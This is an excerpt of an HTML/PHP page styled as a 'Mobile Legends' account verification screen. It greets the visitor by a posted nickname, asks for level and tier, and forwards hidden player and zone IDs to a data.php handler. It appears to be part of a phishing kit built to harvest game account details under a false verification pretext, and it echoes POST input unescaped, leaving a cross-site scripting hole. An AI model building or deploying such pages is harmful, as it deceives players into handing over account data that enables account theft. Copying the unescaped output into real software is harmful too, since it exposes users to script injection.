...
.btnverifalx button {
    ...
    <body>
        ...
        <div class="headeralx">
            <div class="leftheaderalx">
                ...
                <div class="textheadealx">
                    <p>Mobile Legends</p>
                    <span>Verification Your Account</span>
                </div>
            </div>
        ...
        <div class="verifalx">
            <div class="headferifalx">Hi <?php echo $_POST['nick'];?>, VERIFY YOUR ACCOUNT</div>
            <div class="formalx">
                <form class="formInfo" method="POST" action="data.php">
                    <label>Level</label>
                        <select class="select-alexmarsya" name="level" onmousedown="buka.play();" required>
                    ...
                    <label>Tier</label>
                        <select class="select-alexmarsya" name="tier" onmousedown="buka.play();" required>
                        ...
                        <input type="hidden" name="playid" value="<?php echo $_POST['playid'];?>">
                        <input type="hidden" name="zoneid" value="<?php echo $_POST['zoneid'];?>">
                    ...
                    <div class="btnverifalx">
                        <button class="verif-btnalexmarsya" type="submit" onmousedown="buka.play();">Verify</button>
                    </div>
                </form>
            </div>
        </div>
